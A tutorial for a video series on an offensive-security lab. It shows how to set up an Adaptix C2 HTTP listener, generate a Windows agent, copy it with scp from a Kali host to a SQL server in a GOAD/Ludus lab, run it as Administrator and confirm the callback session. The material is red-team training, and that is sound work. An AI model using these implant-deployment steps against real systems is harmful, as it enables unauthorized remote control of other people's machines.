## **08   Adaptix C2 in Action: Building a Listener and Implanting the GOAD NHA SQL Server**

This guide accompanies the **eighth video** in your series, demonstrating how to create an HTTP listener, generate a Windows agent, and implant it on SQL Server 1 in the NHA-GOAD lab. You’ll use SCP to transfer the agent from Kali to sql server, execute the implant, and validate the connection in Adaptix C2.

---

# **Key Takeaways**

## 1. **Listener and Agent Basics**

- **Listener**: A network endpoint in Adaptix C2 that waits for agent connections (beacons).
    
- **Agent**: The executable payload deployed to a target (here, sql server) that connects back to the C2.
    

## 2. **Workflow Overview**

- Create a Beacon HTTP listener in Adaptix.
    
- Generate a Windows agent tied to the listener.
    
- Organize payloads on Kali for easy transfer.
    
- Use SCP from sql server to fetch the agent from Kali.
    
- Run the agent on sql server and verify the session in Adaptix.
    

---

# **Step-by-Step Implant Deployment Guide**

## **1. Create a Beacon HTTP Listener in Adaptix**

1. **On Kali, launch AdaptixClient:**
```bash
  adaptixclient
```
    
2. **Navigate to the Listeners tab.**
    
3. **Click “Add Listener” > Select “Beacon HTTP”.**
    
4. **Configure parameters:**
    
    - **Name:** http-listener
        
    - **Port:** 443 (or your preferred port)
        
    - **Bind Address:** 10.3.99.1 <adaptix_c2_server_ip>
        
5. **Save and start the listener.**
    
    - Confirm the listener shows as “Active.”
        

## **2. Generate a Windows Agent Payload**

1. **Go to the Agents/Implants tab in AdaptixClient.**
    
2. **Click “Generate Agent” **
    
3. **Choose:**
    
    - **Listener:** http-listener (created above)
        
    - **Platform:** Windows
        
    - **Architecture:** x64
        
4. **Click “Generate.”**
    
5. **Note the output file location (e.g., `/home/kali/Desktop/payloads/adapt.exe`).**
    

## **3. Prepare Payloads Directory on Kali**

```cmd
mkdir -p /home/kali/Desktop/payloads
cp /home/kali/adapt.exe /home/kali/Desktop/payloads/

```

## **4. Transfer Agent to SQL Server 1 via SCP**

- **From sql server (after RDP login), open Command Prompt.**
    
- **Run:**
```cmd
scp kali@10.3.99.2:/home/kali/Desktop/payloads/adapt.exe C:\ludus\

```
    
    - **Password:** kali
        

> **Note:** If `scp` is not installed, use [WinSCP](https://winscp.net/) or [pscp.exe](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html).

## **5. Run the Agent on sql server**

1. **On sql server, open Command Prompt as Administrator.**
    
2. **Navigate to the target directory:**
    
    `cd C:\ludus`
    
3. **Execute the agent:**
    
    `adapt.exe`
    
4. **No output means the agent is running.**
    

## **6. Validate Connection in Adaptix**

- **In AdaptixClient (Kali), check the Sessions/Agents tab.**
    
- **Look for a new session from sql server.**
    
- **Status should show as “Active” or “Connected.”**
    

---

# **Tools Used**

- **Adaptix C2:** C2 framework for agent/listener management  
    [Adaptix Docs](https://adaptix-framework.gitbook.io/adaptix-framework/adaptix-c2/getting-starting/starting)
    
- **Kali Linux:** Operator VM for Adaptix and payload hosting
    
- **sql server:** Target Windows host for implant
    
- **SCP:** Secure file copy for agent transfer  
    [SCP Guide](https://www.ssh.com/academy/ssh/scp)
    
- **RDP:** Remote Desktop Protocol for Windows access
    
---

# **References**

1. [Adaptix Framework - Getting Started](https://adaptix-framework.gitbook.io/adaptix-framework/adaptix-c2/getting-starting/starting)
    
2. [Ludus Platform Docs](https://docs.ludus.cloud/docs/roles)
    
3. [WinSCP Download](https://winscp.net/)
    

---

> [Subscribe for updates](https://www.youtube.com/@ITSecurityLabs)